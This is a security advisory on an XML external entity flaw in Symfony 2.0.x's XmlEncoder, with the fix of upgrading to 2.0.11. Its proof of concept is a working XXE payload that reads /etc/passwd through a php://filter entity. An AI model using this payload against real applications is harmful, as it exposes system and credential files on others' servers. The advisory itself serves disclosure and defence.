Solution Status.                Vendor patch / Upgrade to 2.0.11
CVE reference.                  CVE - not yet assigned
Details.
The XMLEncoder component of Symfony 2.0.x fails to disable external
entities when parsing XML. In the Symfony2 framework the XML class
may be used to deserialize objects or as part of a client/server
API. By using external entities it is possible to include arbitrary
files from the file system. Any application written in Symfony2
that parses user supplied XML is affected.
Proof of Concept.
$serializer = new Serializer(array(), array(
    &#039;xml&#039; => new \Symfony\Component\Serializer\Encoder\XmlEncoder()
));
$x = $serializer->decode(&#039;<?xml version="1.0"?><!DOCTYPE scan
[<!ENTITY test SYSTEM
"php://filter/read=convert.base64-encode/resource=/etc/passwd">]><scan>&test;</scan>&#039;,
&#039;xml&#039;);
var_dump($x);
// $x will now contain a copy of /etc/passwd base64 encoded.
Solution.
Upgrade to Symfony 2.0.11 or apply the vendor provided patch.
